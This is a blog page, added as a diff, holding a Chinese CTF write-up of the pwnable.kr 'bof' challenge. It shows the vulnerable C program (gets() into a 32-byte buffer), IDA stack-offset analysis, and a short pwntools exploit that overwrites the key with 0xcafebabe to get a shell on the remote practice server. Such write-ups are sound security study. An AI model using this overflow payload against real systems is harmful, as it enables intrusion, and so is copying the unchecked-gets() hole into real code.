+          <h1 id="题目简介"><a href="#题目简介" class="headerlink" title="题目简介"></a>题目简介</h1><p>一道简单的溢出题目</p>
+<h1 id="解题流程"><a href="#解题流程" class="headerlink" title="解题流程"></a>解题流程</h1><h2 id="源码分析"><a href="#源码分析" class="headerlink" title="源码分析"></a>源码分析</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="type">void</span> <span class="title function_">func</span><span class="params">(<span class="type">int</span> key)</span>&#123;</span><br><span class="line">	<span class="type">char</span> overflowme[<span class="number">32</span>];</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;overflow me : &quot;</span>);</span><br><span class="line">	gets(overflowme);	<span class="comment">// smash me!</span></span><br><span class="line">	<span class="keyword">if</span>(key == <span class="number">0xcafebabe</span>)&#123;</span><br><span class="line">		system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span>&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;Nah..\n&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>* argv[])</span>&#123;</span><br><span class="line">	func(<span class="number">0xdeadbeef</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>可以看出gets函数存在栈溢出漏洞，明显需要溢出覆盖<code>key</code>为<code>0xcafebabe</code>然后获得flag。</p>
+<h2 id="静态分析"><a href="#静态分析" class="headerlink" title="静态分析"></a>静态分析</h2><p>拖到32位ida，进入func函数，查看栈结构</p>
+<p><img src="/bof(wp)/image-20220712190744409.png" alt="image-20220712190744409"></p>
+<p>上图<code>arg_0</code>就是函数传进来的参数也就是<code>key</code>的位置，这样就可以计算<code>s</code>和<code>key</code>相差0x34个字节，再向后将<code>key</code>的位置覆盖为<code>0xcafebabe</code>就可以获得flag。</p>
+<h1 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">io = remote(<span class="string">&#x27;pwnable.kr&#x27;</span>, <span class="number">9000</span>)</span><br><span class="line">value = <span class="number">0xCAFeBABe</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">52</span> + p32(value)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
+
+  <nav class="pagination">
+    <a class="extend prev" rel="prev" title="上一页" aria-label="上一页" href="/archives/page/2/"><i class="fa fa-angle-left"></i></a><a class="page-number" href="/archives/">1</a><a class="page-number" href="/archives/page/2/">2</a><span class="page-number current">3</span><a class="page-number" href="/archives/page/4/">4</a><span class="space">&hellip;</span><a class="page-number" href="/archives/page/6/">6</a><a class="extend next" rel="next" title="下一页" aria-label="下一页" href="/archives/page/4/"><i class="fa fa-angle-right"></i></a>
+  </nav>
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+  <div class="beian"><a href="https://beian.miit.gov.cn/" rel="noopener" target="_blank">浙ICP备2022023783号-1 </a>
+  </div>
+  <div class="copyright">
+    &copy; 
+    <span itemprop="copyrightYear">2024</span>
+    <span class="with-love">
+      <i class="fa fa-heart"></i>
+    </span>
+    <span class="author" itemprop="copyrightHolder">nnnpc、commit、Eureka</span>
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+  <div class="sidebar-dimmer"></div>
+  <div class="back-to-top" role="button" aria-label="返回顶部">
+    <i class="fa fa-arrow-up fa-lg"></i>
+    <span>0%</span>
+  </div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/next-theme-pjax/0.6.0/pjax.min.js" integrity="sha256-vxLn1tSKWD4dqbMRyv940UYw4sXgMtYcK6reefzZrao=" crossorigin="anonymous"></script>
+<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/schemes/muse.js"></script><script src="/js/next-boot.js"></script><script src="/js/pjax.js"></script>
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-generator-searchdb/1.4.1/search.js" integrity="sha256-1kfA5uHPf65M5cphT2dvymhkuyHPQp5A53EGZOnOLmc=" crossorigin="anonymous"></script>
+<script src="/js/third-party/search/local-search.js"></script>
+
+
+
+
+
+
+
+  
+
+
+
+
+
+</body>
+</html>
